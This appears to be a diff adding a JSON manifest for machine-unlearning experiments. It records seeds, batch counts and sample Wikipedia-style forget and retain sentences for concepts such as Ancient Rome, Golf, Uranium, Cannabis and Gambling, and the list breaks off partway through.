@@ -1,0 +1,1199 @@
+{
+  "seed": 42,
+  "n_per_split": 15,
+  "selection": {
+    "forget": "First 15 unique texts in the Llama RMU forget prefix (shuffled with seed 42, then min_len=50 / max_len=2000, then the first min(forget_batches, retain_batches, 150) batches at batch_size=8). That prefix is a subset of Gemma/Qwen RMU (batch_size=16), CRISP (all 300), and SNMF feature extraction (all 300).",
+    "retain": "First 15 unique texts in the shared Wikipedia retain list after the same seed-42 shuffle and RMU length filter. This ordered list is identical across concepts because every concept has 300 forget sentences, so shuffle(forget) leaves the RNG in the same state before shuffle(retain)."
+  },
+  "notes": [
+    "Checkpoints do not store sample lists; this file reconstructs them from code + seed + data.",
+    "PISCES does not consume forget/retain sentences (SAE feature edits only), so it does not constrain the set.",
+    "SNMF/EMBER unlearning applies precomputed features. Feature extraction used all 300 concept + all 300 Wikipedia neutrals (train_mf_features hardcodes data/neutral_sentences.json).",
+    "RMU is the bottleneck: it drops texts shorter than 50 chars and stops when either forget or retain batches run out (retain is shorter, so some forget texts are unused).",
+    "Llama CRISP for wmdp-bio and wmdp-cyber used data/cyber_neutral_sentences.json (0 overlap with Wikipedia neutrals). The shared retain list below was NOT used in those two runs.",
+    "Gemma/Qwen CRISP and all RMU WMDP runs used Wikipedia neutrals, including wmdp-cyber."
+  ],
+  "retain_corpus": "data/neutral_sentences.json",
+  "n_retain_raw": 300,
+  "n_retain_rmu_filtered": 258,
+  "n_retain_rmu_filtered_unique": 258,
+  "retain": [
+    {
+      "text": "Dezső Szomory (born Moshe Weisz;[1] 2 June 1869 – 30 November 1944) was a Hungarian Jewish writer and dramatist.",
+      "char_len": 112,
+      "source_index": 130
+    },
+    {
+      "text": "\n\nEosqualiolus is an extinct genus of sharks in the family Dalatiidae.",
+      "char_len": 70,
+      "source_index": 223
+    },
+    {
+      "text": "75 female refugees from multiple countries, including Syria, are being detained in prison for allegedly having fake passports, being undocumented, and attempting to depart.",
+      "char_len": 172,
+      "source_index": 59
+    },
+    {
+      "text": "In all cases, their enthusiasm is unwavering, and their dogged pursuit of the truth turns up more delightful discoveries than a family vacation ever could.",
+      "char_len": 155,
+      "source_index": 198
+    },
+    {
+      "text": "  Win\n  Draw\n  Loss\n\n  Win\n  Draw\n  Loss\n\n  Win\n  Draw\n  Loss\n\n8th Russian futsal championship 1999/2000[2]\n\n\n8th Russian women futsal championship 1999/2000",
+      "char_len": 157,
+      "source_index": 121
+    },
+    {
+      "text": "The state of Tennessee passed an extension of law in 1901 to their version of the 1870 Jim Crow law, which forced private schools such as Maryville College to expel their African American students.",
+      "char_len": 197,
+      "source_index": 138
+    },
+    {
+      "text": "The hospital has a team of Pakistan Navy medical doctors, surgeons & paramedical staff(AFNS officers & Medical Technicians) providing the best services to patients.",
+      "char_len": 164,
+      "source_index": 81
+    },
+    {
+      "text": "Wojciech Sławomir Smoczyński[1] (born March 12, 1945, in Głowno near Łowicz) is a Polish linguist.",
+      "char_len": 98,
+      "source_index": 3
+    },
+    {
+      "text": "It is situated on the eastern bank of the Fulda, 4 km east of Kassel (centre).",
+      "char_len": 78,
+      "source_index": 252
+    },
+    {
+      "text": "At the first referendum of 1980, étapisme was also implemented in the referendum process, since the question asked for a mandate to negotiate sovereignty-association with Canada with the commitment to hold a second referendum to ratify the resulting agreement.",
+      "char_len": 260,
+      "source_index": 145
+    },
+    {
+      "text": "\n\nNeocurtimorda perpusilla is a species of beetle in the genus Neocurtimorda of the family Mordellidae.",
+      "char_len": 103,
+      "source_index": 295
+    },
+    {
+      "text": "On 4 June 1854 he had married Elizabeth Johnston, first cousin to Jessie (née Grindlay) wife of Sir James Young Simpson, and they had had six children, all of whom survived him.",
+      "char_len": 177,
+      "source_index": 75
+    },
+    {
+      "text": "He is Director of CAUSALab, Kolokotrones Professor of Biostatistics and Epidemiology at the Harvard T.H.",
+      "char_len": 104,
+      "source_index": 96
+    },
+    {
+      "text": "[8]\n\nThe Steel Curtain roller coaster at Kennywood, which opened in 2019,[9] was named after the Steelers' defensive line.",
+      "char_len": 122,
+      "source_index": 193
+    },
+    {
+      "text": "In a press release announcing a new album, the band said \"both parties came to a mutual decision\" and wished Christian well in his future musical endeavors.",
+      "char_len": 156,
+      "source_index": 119
+    }
+  ],
+  "concepts": [
+    {
+      "concept": "Ancient Rome",
+      "n_forget_raw": 300,
+      "n_forget_raw_unique": 300,
+      "n_forget_rmu_filtered": 283,
+      "n_forget_crisp": 300,
+      "rmu_usage": {
+        "google/gemma-2-2b-it": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "Qwen/Qwen3.5-2B": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "meta-llama/Llama-3.1-8B-Instruct": {
+          "batch_size": 8,
+          "n_batches": 33,
+          "n_forget_used": 264,
+          "n_forget_used_unique": 264,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        }
+      },
+      "forget": [
+        {
+          "text": "Ancient Rome is the progenitor of Western civilisation.",
+          "char_len": 55,
+          "source_index": 106
+        },
+        {
+          "text": "He remodelled the Pantheon and extended the Circus Maximus.",
+          "char_len": 59,
+          "source_index": 37
+        },
+        {
+          "text": "Dice games, board games, and gamble games were popular pastimes.",
+          "char_len": 64,
+          "source_index": 89
+        },
+        {
+          "text": "It had theatres, gymnasiums, marketplaces, functional sewers, bath complexes complete with libraries and shops, and fountains with fresh drinking water supplied by hundreds of miles of aqueducts.",
+          "char_len": 195,
+          "source_index": 32
+        },
+        {
+          "text": "The next emperor, Theodosius I (379–395), gave even more force to the Christian faith, and after his death, the Empire was divided into the Eastern Roman Empire, ruled by Arcadius and the Western Roman Empire, commanded by Honorius, both of which were Theodosius' sons.",
+          "char_len": 269,
+          "source_index": 250
+        },
+        {
+          "text": "Under Emperor Diocletian, the persecution of Christians reached its peak.",
+          "char_len": 73,
+          "source_index": 192
+        },
+        {
+          "text": "The Gauls then agreed to give the Romans peace in exchange for 1000 pounds of gold.",
+          "char_len": 83,
+          "source_index": 120
+        },
+        {
+          "text": "Commodus, son of Marcus Aurelius, became emperor after his father's death.",
+          "char_len": 74,
+          "source_index": 19
+        },
+        {
+          "text": "He continued Severus' policy and gained respect from the legions.",
+          "char_len": 65,
+          "source_index": 225
+        },
+        {
+          "text": "These were no longer members of the Roman elite but men who came up through the ranks and had seen much practical soldiering.",
+          "char_len": 125,
+          "source_index": 24
+        },
+        {
+          "text": "Starting from c. 650 BC, the Romans started to drain the valley between the Capitoline and Palatine Hills, where today sits the Roman Forum.",
+          "char_len": 140,
+          "source_index": 295
+        },
+        {
+          "text": "Unlike in Greek mythology, the gods were not personified, but were vaguely defined sacred spirits called numina.",
+          "char_len": 112,
+          "source_index": 103
+        },
+        {
+          "text": "After a dispute, Romulus killed Remus and became the city's sole founder.",
+          "char_len": 73,
+          "source_index": 220
+        },
+        {
+          "text": "Knowing that the citizens of Alexandria disliked him and were denigrating his character, Caracalla served a banquet for its notable citizens, after which his soldiers killed all the guests.",
+          "char_len": 189,
+          "source_index": 205
+        },
+        {
+          "text": "In the following century, the Arabs captured southern Italy and Sicily.",
+          "char_len": 71,
+          "source_index": 297
+        }
+      ]
+    },
+    {
+      "concept": "Golf",
+      "n_forget_raw": 300,
+      "n_forget_raw_unique": 300,
+      "n_forget_rmu_filtered": 293,
+      "n_forget_crisp": 300,
+      "rmu_usage": {
+        "google/gemma-2-2b-it": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "Qwen/Qwen3.5-2B": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "meta-llama/Llama-3.1-8B-Instruct": {
+          "batch_size": 8,
+          "n_batches": 33,
+          "n_forget_used": 264,
+          "n_forget_used_unique": 264,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        }
+      },
+      "forget": [
+        {
+          "text": "Stronger muscles in the wrist can prevent them from being twisted during swings, whilst stronger shoulders increase the turning force.",
+          "char_len": 134,
+          "source_index": 106
+        },
+        {
+          "text": "In the United States, women made up 25 percent of golfers in 2021, which was up from 19 percent since 2011 and junior female golfers account for 35 percent or 1.1 million golfers.",
+          "char_len": 179,
+          "source_index": 239
+        },
+        {
+          "text": "While many holes are designed with a direct line-of-sight from the teeing area to the green, some holes may bend either to the left or to the right.",
+          "char_len": 148,
+          "source_index": 37
+        },
+        {
+          "text": "Traditionally the clubhead was forged from iron; modern iron clubheads are investment-cast from a steel alloy.",
+          "char_len": 110,
+          "source_index": 89
+        },
+        {
+          "text": "The typical amount of time required for pace of play is about two hours for a 9-hole round and four hours for an 18-hole round.",
+          "char_len": 127,
+          "source_index": 32
+        },
+        {
+          "text": "Golf balls are spherical, usually white (although other colours are allowed), and minutely pock-marked by dimples that decrease aerodynamic drag by increasing air turbulence around the ball in motion, which delays \"boundary layer\" separation and reduces the drag-inducing \"wake\" behind the ball, thereby allowing the ball to fly farther.",
+          "char_len": 337,
+          "source_index": 250
+        },
+        {
+          "text": "Some common and popular examples are listed below.",
+          "char_len": 50,
+          "source_index": 192
+        },
+        {
+          "text": "A hole is classified by its par, which gives an indication of the number of strokes a skilled golfer may be expected to need to complete play of the hole.",
+          "char_len": 154,
+          "source_index": 120
+        },
+        {
+          "text": "The ball is typically positioned more to the \"front\" of the player's stance (closer to the leading foot) for lower-lofted clubs, with the usual ball position for a drive being just behind the arch of the leading foot.",
+          "char_len": 217,
+          "source_index": 19
+        },
+        {
+          "text": "Either one or two strokes are added for most rule infractions or for taking relief from various situations, with the \"general penalty\" defined as two-strokes, and disqualification for severe or repeated rule breaches.",
+          "char_len": 217,
+          "source_index": 225
+        },
+        {
+          "text": "All of the principal tours offer points in the Women's World Golf Rankings for high finishers in their events.",
+          "char_len": 110,
+          "source_index": 24
+        },
+        {
+          "text": "Playoffs either are sudden death or employ a pre-determined number of holes, anywhere from three to a full 18.",
+          "char_len": 110,
+          "source_index": 295
+        },
+        {
+          "text": "The oldest surviving rules of golf were compiled in March 1744 for the Company of Gentlemen Golfers, later renamed The Honourable Company of Edinburgh Golfers, which was played at Leith, Scotland.",
+          "char_len": 196,
+          "source_index": 103
+        },
+        {
+          "text": "She was able to prove herself on the course, going on to become the first American to win the British Women's Amateur title in 1947.",
+          "char_len": 132,
+          "source_index": 220
+        },
+        {
+          "text": "Stance refers to how the golfer positions themselves in order to play a stroke; it is fundamentally important in being able to play a stroke effectively.",
+          "char_len": 153,
+          "source_index": 205
+        }
+      ]
+    },
+    {
+      "concept": "Uranium",
+      "n_forget_raw": 300,
+      "n_forget_raw_unique": 300,
+      "n_forget_rmu_filtered": 293,
+      "n_forget_crisp": 300,
+      "rmu_usage": {
+        "google/gemma-2-2b-it": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "Qwen/Qwen3.5-2B": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "meta-llama/Llama-3.1-8B-Instruct": {
+          "batch_size": 8,
+          "n_batches": 33,
+          "n_forget_used": 264,
+          "n_forget_used_unique": 264,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        }
+      },
+      "forget": [
+        {
+          "text": "In 2012, ORNL researchers announced the successful development of a new absorbent material dubbed HiCap which performs surface retention of solid or gas molecules, atoms or ions and also effectively removes toxic metals from water, according to results verified by researchers at Pacific Northwest National Laboratory.",
+          "char_len": 318,
+          "source_index": 106
+        },
+        {
+          "text": "The CANDU and Magnox designs are the only commercial reactors capable of using unenriched uranium fuel.",
+          "char_len": 103,
+          "source_index": 239
+        },
+        {
+          "text": "After one day, one gram of bacteria can encrust themselves with nine grams of uranyl phosphate crystals; this creates the possibility that these organisms could be used in bioremediation to decontaminate uranium-polluted water.",
+          "char_len": 227,
+          "source_index": 37
+        },
+        {
+          "text": "Other naturally occurring isotopes such as Uranium-238 are fissionable, but not fissile, meaning that they only undergo fission when absorbing high energy (fast) neutrons.",
+          "char_len": 171,
+          "source_index": 89
+        },
+        {
+          "text": "After entering the bloodstream, the absorbed uranium tends to bioaccumulate and stay for many years in bone tissue because of uranium's affinity for phosphates.",
+          "char_len": 160,
+          "source_index": 32
+        },
+        {
+          "text": "Reduction of UF4 with hydrogen at 1000 °C produces uranium trifluoride (UF3).",
+          "char_len": 77,
+          "source_index": 250
+        },
+        {
+          "text": "The Occupational Safety and Health Administration (OSHA) has set the permissible exposure limit for uranium exposure in the workplace as 0.25 mg/m3 over an 8-hour workday.",
+          "char_len": 171,
+          "source_index": 192
+        },
+        {
+          "text": "On 2 December 1942, as part of the Manhattan Project, another team led by Enrico Fermi was able to initiate the first artificial self-sustained nuclear chain reaction, Chicago Pile-1.",
+          "char_len": 183,
+          "source_index": 120
+        },
+        {
+          "text": "Fermi urged Alfred O. C. Nier to separate uranium isotopes for determination of the fissile component, and on 29 February 1940, Nier used an instrument he built at the University of Minnesota to separate the world's first uranium-235 sample in the Tate Laboratory.",
+          "char_len": 264,
+          "source_index": 19
+        },
+        {
+          "text": "Isotope separation concentrates (enriches) the fissile uranium-235 for nuclear weapons and most nuclear power plants, except for gas cooled reactors and pressurized heavy water reactors.",
+          "char_len": 186,
+          "source_index": 225
+        },
+        {
+          "text": "Extensive measures must be employed to extract the metal from its ore. High-grade ores found in Athabasca Basin deposits in Saskatchewan, Canada can contain up to 23% uranium oxides on average.",
+          "char_len": 193,
+          "source_index": 24
+        },
+        {
+          "text": "Bromides and iodides of uranium are formed by direct reaction of, respectively, bromine and iodine with uranium or by adding UH3 to those element's acids.",
+          "char_len": 154,
+          "source_index": 295
+        },
+        {
+          "text": "Uranium oxyhalides are water-soluble and include UO2F2, UOCl2, UO2Cl2, and UO2Br2.",
+          "char_len": 82,
+          "source_index": 103
+        },
+        {
+          "text": "Commercial nuclear power plants use fuel that is typically enriched to around 3% uranium-235.",
+          "char_len": 93,
+          "source_index": 220
+        },
+        {
+          "text": "An excess risk of lung cancer among Navajo uranium miners, for example, has been documented and linked to their occupation.",
+          "char_len": 123,
+          "source_index": 205
+        }
+      ]
+    },
+    {
+      "concept": "Culture of Greece",
+      "n_forget_raw": 300,
+      "n_forget_raw_unique": 300,
+      "n_forget_rmu_filtered": 293,
+      "n_forget_crisp": 300,
+      "rmu_usage": {
+        "google/gemma-2-2b-it": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "Qwen/Qwen3.5-2B": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "meta-llama/Llama-3.1-8B-Instruct": {
+          "batch_size": 8,
+          "n_batches": 33,
+          "n_forget_used": 264,
+          "n_forget_used_unique": 264,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        }
+      },
+      "forget": [
+        {
+          "text": "Adamantios Korais and Rigas Feraios are two of the most notable figures.",
+          "char_len": 72,
+          "source_index": 106
+        },
+        {
+          "text": "Cinema first appeared in Greece in 1896, but the first actual cine-theatre was opened in 1907.",
+          "char_len": 94,
+          "source_index": 239
+        },
+        {
+          "text": "Thales of Miletus is regarded by many as the father of science; he was the first of the ancient philosophers to seek to explain the physical world in terms of natural rather than supernatural causes.",
+          "char_len": 199,
+          "source_index": 37
+        },
+        {
+          "text": "One of the more famous type of church constructed by the Byzantines was the basilica, which was very widespread and received the most development of the churches that were built in the empire.",
+          "char_len": 192,
+          "source_index": 89
+        },
+        {
+          "text": "[citation needed] Greeks continue to contribute to science and technology in the modern world.",
+          "char_len": 94,
+          "source_index": 32
+        },
+        {
+          "text": "Ancient Greek cuisine was characterized by its frugality and was founded on the \"Mediterranean triad\": wheat, olive oil, and wine, with meat being rarely eaten and fish being more common.",
+          "char_len": 187,
+          "source_index": 250
+        },
+        {
+          "text": "The history of music in Greece begins with the music of ancient Greece, largely structured on the Lyre and other supporting string instruments of the era.",
+          "char_len": 154,
+          "source_index": 192
+        },
+        {
+          "text": "The Order of the Redeemer and military decoration Cross of Valour both have ribbons in the national colours.",
+          "char_len": 108,
+          "source_index": 120
+        },
+        {
+          "text": "Chryselephantine sculptures, used for temple cult images and luxury works, used gold, most often in leaf form and ivory for all or parts (faces and hands) of the figure, and probably gems and other materials, but were much less common, and only fragments have survived.",
+          "char_len": 269,
+          "source_index": 19
+        },
+        {
+          "text": "Additionally, students are admitted to the Hellenic Open University upon the completion of the 22 year of age by drawing lots.",
+          "char_len": 126,
+          "source_index": 225
+        },
+        {
+          "text": "Outstanding literary figures of the Hellenistic period were Menander, the chief representative of a newer type of comedy; the poets Callimachus, Theocritus, and Apollonius Rhodius, author of the Argonautica; and Polybius, who wrote a detailed history of the Mediterranean world.",
+          "char_len": 278,
+          "source_index": 24
+        },
+        {
+          "text": "More recently, the rise of internet-based communication services as well as cell phones have caused a distinctive form of Greek written partially, and sometimes fully in Latin characters to emerge; this is known as Greeklish, a form that has spread across the Greek diaspora and even to the two countries with majority Greek population, Greece and Cyprus.",
+          "char_len": 355,
+          "source_index": 295
+        },
+        {
+          "text": "Much later, Diafotismos was an ideological, philological, linguistic and philosophical movement among 18th century Greeks that translate the ideas and values of European Enlightenment into the Greek world.",
+          "char_len": 205,
+          "source_index": 103
+        },
+        {
+          "text": "Nea Dimokratia (New Democracy), the Greek conservative right political party, has claimed that it will change the law so that private universities gain recognition.",
+          "char_len": 164,
+          "source_index": 220
+        },
+        {
+          "text": "For example, in Romania, the Brâncovenesc style is highly based on Byzantine architecture, but also has individual Romanian characteristics.",
+          "char_len": 140,
+          "source_index": 205
+        }
+      ]
+    },
+    {
+      "concept": "Cannabis",
+      "n_forget_raw": 300,
+      "n_forget_raw_unique": 299,
+      "n_forget_rmu_filtered": 295,
+      "n_forget_crisp": 300,
+      "rmu_usage": {
+        "google/gemma-2-2b-it": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "Qwen/Qwen3.5-2B": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "meta-llama/Llama-3.1-8B-Instruct": {
+          "batch_size": 8,
+          "n_batches": 33,
+          "n_forget_used": 264,
+          "n_forget_used_unique": 264,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        }
+      },
+      "forget": [
+        {
+          "text": "Smoking cannabis has also been shown to increase the risk of myocardial infarction by 4.8 times for the 60 minutes after consumption.",
+          "char_len": 133,
+          "source_index": 106
+        },
+        {
+          "text": "Many researchers have suggested that sex in Cannabis is determined or strongly influenced by environmental factors.",
+          "char_len": 115,
+          "source_index": 239
+        },
+        {
+          "text": "It has been used as a drug for both recreational and entheogenic purposes and in various traditional medicines for centuries.",
+          "char_len": 125,
+          "source_index": 37
+        },
+        {
+          "text": "One review found three prospective cohort studies that examined the relationship between self-reported cannabis use and intelligence quotient (IQ).",
+          "char_len": 147,
+          "source_index": 89
+        },
+        {
+          "text": "In Australia, it is legalized only in the Australian Capital Territory.",
+          "char_len": 71,
+          "source_index": 32
+        },
+        {
+          "text": "In Akkadian, cannabis was known as qunubu (𐎯𐎫𐎠𐎭𐏂).",
+          "char_len": 50,
+          "source_index": 101
+        },
+        {
+          "text": "Light and moderate use of cannabis is not believed to increase risk of lung or upper airway cancer.",
+          "char_len": 99,
+          "source_index": 192
+        },
+        {
+          "text": "Advanced cultivation techniques such as hydroponics, cloning, high-intensity artificial lighting, and the sea of green method are frequently employed as a response (in part) to prohibition enforcement efforts that make outdoor cultivation more risky.",
+          "char_len": 250,
+          "source_index": 120
+        },
+        {
+          "text": "The question of whether heteromorphic sex chromosomes are indeed present is most conveniently answered if such chromosomes were clearly visible in a karyotype.",
+          "char_len": 159,
+          "source_index": 19
+        },
+        {
+          "text": "The average levels of THC in cannabis sold in the United States rose dramatically between the 1970s and 2000.",
+          "char_len": 109,
+          "source_index": 225
+        },
+        {
+          "text": "In 129,000 cases, cannabis was the only implicated drug.",
+          "char_len": 56,
+          "source_index": 295
+        },
+        {
+          "text": "\"Skunk\" refers to several named strains of potent cannabis, grown through selective breeding and sometimes hydroponics.",
+          "char_len": 119,
+          "source_index": 103
+        },
+        {
+          "text": "The defense attorneys were not often successful in winning their case, because the intent of the law was clear.",
+          "char_len": 111,
+          "source_index": 220
+        },
+        {
+          "text": "It may be \"associated with diseases of the liver (particularly with co-existing hepatitis C), lungs, heart, and vasculature\".",
+          "char_len": 125,
+          "source_index": 205
+        },
+        {
+          "text": "According to DSM-5 criteria, 9% of those who are exposed to cannabis develop cannabis use disorder, compared to 20% for cocaine, 23% for alcohol and 68% for nicotine.",
+          "char_len": 166,
+          "source_index": 297
+        }
+      ]
+    },
+    {
+      "concept": "Baseball",
+      "n_forget_raw": 300,
+      "n_forget_raw_unique": 300,
+      "n_forget_rmu_filtered": 290,
+      "n_forget_crisp": 300,
+      "rmu_usage": {
+        "google/gemma-2-2b-it": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "Qwen/Qwen3.5-2B": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "meta-llama/Llama-3.1-8B-Instruct": {
+          "batch_size": 8,
+          "n_batches": 33,
+          "n_forget_used": 264,
+          "n_forget_used_unique": 264,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        }
+      },
+      "forget": [
+        {
+          "text": "The hit and run is sometimes employed, with a skillful contact hitter, the runner takes off with the pitch, drawing the shortstop or second baseman over to second base, creating a gap in the infield for the batter to poke the ball through.",
+          "char_len": 239,
+          "source_index": 106
+        },
+        {
+          "text": "With a team that has the lead in the late innings, a manager may remove a starting position player—especially one whose turn at bat is not likely to come up again—for a more skillful fielder (known as a defensive substitution).",
+          "char_len": 227,
+          "source_index": 239
+        },
+        {
+          "text": "The number of players has fallen since the 1990s, when 3 million children took part in Little League Baseball annually.",
+          "char_len": 119,
+          "source_index": 37
+        },
+        {
+          "text": "Several basic offensive tactics come into play with a runner on first base, including the fundamental choice of whether to attempt a steal of second base.",
+          "char_len": 154,
+          "source_index": 89
+        },
+        {
+          "text": "In 1887, softball, under the name of indoor baseball or indoor-outdoor, was invented as a winter version of the parent game.",
+          "char_len": 124,
+          "source_index": 32
+        },
+        {
+          "text": "The field boomed with increasing Internet access and new fantasy sports-related websites.",
+          "char_len": 89,
+          "source_index": 250
+        },
+        {
+          "text": "Latin-American players, largely overlooked before, also started entering the majors in greater numbers.",
+          "char_len": 103,
+          "source_index": 192
+        },
+        {
+          "text": "In Asia, South Korea (1982), Taiwan (1990) and China (2003) all have professional leagues.",
+          "char_len": 90,
+          "source_index": 120
+        },
+        {
+          "text": "At a minimum, one umpire will stand behind the catcher, to have a good view of the strike zone, and call balls and strikes.",
+          "char_len": 123,
+          "source_index": 19
+        },
+        {
+          "text": "The rules provide detailed criteria to promote consistency.",
+          "char_len": 59,
+          "source_index": 225
+        },
+        {
+          "text": "In Japan, where baseball is inarguably the leading spectator team sport, combined revenue for the twelve teams in Nippon Professional Baseball (NPB), the body that oversees both the Central and Pacific Leagues, was estimated at $1 billion in 2007.",
+          "char_len": 247,
+          "source_index": 24
+        },
+        {
+          "text": "The manager, or head coach, oversees the team's major strategic decisions, such as establishing the starting rotation, setting the lineup, or batting order, before each game, and making substitutions during games—in particular, bringing in relief pitchers.",
+          "char_len": 256,
+          "source_index": 295
+        },
+        {
+          "text": "The DH takes the place of another player—almost invariably the pitcher—in the batting order, but does not field.",
+          "char_len": 112,
+          "source_index": 103
+        },
+        {
+          "text": "In clock-limited sports, games often end with a team that holds the lead killing the clock rather than competing aggressively against the opposing team.",
+          "char_len": 152,
+          "source_index": 220
+        },
+        {
+          "text": "The tournaments are known, respectively, as Spring Koshien and Summer Koshien after the 55,000-capacity stadium where they are played.",
+          "char_len": 134,
+          "source_index": 205
+        }
+      ]
+    },
+    {
+      "concept": "Gambling",
+      "n_forget_raw": 300,
+      "n_forget_raw_unique": 217,
+      "n_forget_rmu_filtered": 287,
+      "n_forget_crisp": 300,
+      "rmu_usage": {
+        "google/gemma-2-2b-it": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 197,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "Qwen/Qwen3.5-2B": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 197,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "meta-llama/Llama-3.1-8B-Instruct": {
+          "batch_size": 8,
+          "n_batches": 33,
+          "n_forget_used": 264,
+          "n_forget_used_unique": 193,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        }
+      },
+      "forget": [
+        {
+          "text": "Some of the most famous casinos in the world include the Monte Carlo Casino, The Venetian Macao, and Caesars Palace.",
+          "char_len": 116,
+          "source_index": 106
+        },
+        {
+          "text": "Native American gaming has been responsible for a rise in the number of casinos outside of Las Vegas and Atlantic City.",
+          "char_len": 119,
+          "source_index": 49
+        },
+        {
+          "text": "Gambling has been a popular activity in the United States for centuries.",
+          "char_len": 72,
+          "source_index": 37
+        },
+        {
+          "text": "Queen Elizabeth I chartered a lottery that was drawn in 1569.",
+          "char_len": 61,
+          "source_index": 89
+        },
+        {
+          "text": "However, in 1931, gambling was legalized in Nevada, leading to the rise of Las Vegas as a major gambling center.",
+          "char_len": 112,
+          "source_index": 32
+        },
+        {
+          "text": "The archipelago of Malta is a particularly famous place for casinos, standing out mainly with the historic casino located at the princely residence of Dragonara.",
+          "char_len": 161,
+          "source_index": 188
+        },
+        {
+          "text": "In 1976 New Jersey allowed gambling in Atlantic City, now the US's second largest gambling city.",
+          "char_len": 96,
+          "source_index": 192
+        },
+        {
+          "text": "The two words are not mutually exclusive; i.e., a \"gaming\" company offers (legal) \"gambling\" activities to the public and may be regulated by one of many gaming control boards, for example, the Nevada Gaming Control Board.",
+          "char_len": 222,
+          "source_index": 120
+        },
+        {
+          "text": "Say: 'In them both lies grave sin, though some benefit, to mankind.",
+          "char_len": 67,
+          "source_index": 19
+        },
+        {
+          "text": "The number continues to grow steadily as more states seek to legalize casinos.",
+          "char_len": 78,
+          "source_index": 161
+        },
+        {
+          "text": "Gambling has often been seen as having social consequences, as satirized by Balzac.",
+          "char_len": 83,
+          "source_index": 24
+        },
+        {
+          "text": "It has been said that economic studies showing a positive relationship between casinos and crime usually fail to consider the visiting population: they count crimes committed by visitors but do not count visitors in the population measure, which overstates the crime rate.",
+          "char_len": 272,
+          "source_index": 158
+        },
+        {
+          "text": "On the other hand, \"gambling houses\" or \"gambling dens\" are smaller, illicit gambling venues.",
+          "char_len": 93,
+          "source_index": 70
+        },
+        {
+          "text": "Poker cards are mainly made of plastic-coated paper, which is difficult to degrade, resulting in a large amount of waste.",
+          "char_len": 121,
+          "source_index": 39
+        },
+        {
+          "text": "Common games include craps, roulette, baccarat, blackjack, and video poker.",
+          "char_len": 75,
+          "source_index": 68
+        }
+      ]
+    },
+    {
+      "concept": "Republic of Ireland",
+      "n_forget_raw": 300,
+      "n_forget_raw_unique": 300,
+      "n_forget_rmu_filtered": 296,
+      "n_forget_crisp": 300,
+      "rmu_usage": {
+        "google/gemma-2-2b-it": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "Qwen/Qwen3.5-2B": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "meta-llama/Llama-3.1-8B-Instruct": {
+          "batch_size": 8,
+          "n_batches": 33,
+          "n_forget_used": 264,
+          "n_forget_used_unique": 264,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        }
+      },
+      "forget": [
+        {
+          "text": "Ireland's patron saints are Saint Patrick, Saint Bridget, and Saint Columba; Saint Patrick is commonly recognised as the primary patron saint.",
+          "char_len": 142,
+          "source_index": 106
+        },
+        {
+          "text": "During the final decades of the 20th century, Edna O'Brien, John McGahern, Maeve Binchy, Joseph O'Connor, Roddy Doyle, Colm Tóibín, and John Banville came to the fore as novelists.",
+          "char_len": 180,
+          "source_index": 239
+        },
+        {
+          "text": "Other results from the 2016 census were: 4.2% Protestant, 1.3% Orthodox, 1.3% Muslim, and 9.8% having no religion.",
+          "char_len": 114,
+          "source_index": 37
+        },
+        {
+          "text": "Christianity introduced simple monastic houses, such as Clonmacnoise, Skellig Michael and Scattery Island.",
+          "char_len": 106,
+          "source_index": 89
+        },
+        {
